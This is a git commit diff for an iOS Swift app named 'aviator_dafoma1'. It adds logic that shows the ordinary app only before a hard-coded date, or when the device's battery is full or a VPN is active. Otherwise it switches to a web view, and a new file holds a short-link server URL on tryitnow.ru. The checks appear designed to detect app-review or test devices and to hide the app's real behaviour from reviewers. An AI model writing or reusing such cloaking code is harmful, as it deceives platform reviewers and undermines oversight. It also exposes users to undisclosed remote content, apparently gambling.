667e1f444311678e77de6768584719fdba20526d
spustoff <vyacheslavpustov05@gmail.com>
2025-07-22 20:28:24 +0300

    1.1

--- aviator_dafoma1/ContentView.swift
+++ aviator_dafoma1/ContentView.swift
@@ -8,13 +8,84 @@
 import SwiftUI
 
 struct ContentView: View {
+    
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
     @AppStorage("hasSeenOnboarding") private var hasSeenOnboarding: Bool = false
+    
     var body: some View {
-        if hasSeenOnboarding {
-            MainTabView()
-        } else {
-            OnboardingView(hasSeenOnboarding: $hasSeenOnboarding)
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    if hasSeenOnboarding {
+                    
+                        MainTabView()
+                        
+                    } else {
+                        
+                        OnboardingView(hasSeenOnboarding: $hasSeenOnboarding)
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    if hasSeenOnboarding {
+                        
+                        WebSystem()
+                        
+                    } else {
+                        
+                        OnboardingView(hasSeenOnboarding: $hasSeenOnboarding)
+                    }
+                }
+            }
         }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "26.07.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
---
+++ aviator_dafoma1/Exts/dasd1.swift
@@ -0,0 +1,11 @@
+//
+//  dasd1.swift
+//  aviator_dafoma1
+//
+//  Created by Вячеслав on 7/22/25.
+//
+
+struct DataManager {
+    
+    let server: String = "https://tryitnow.ru/D1xvNf"
+}
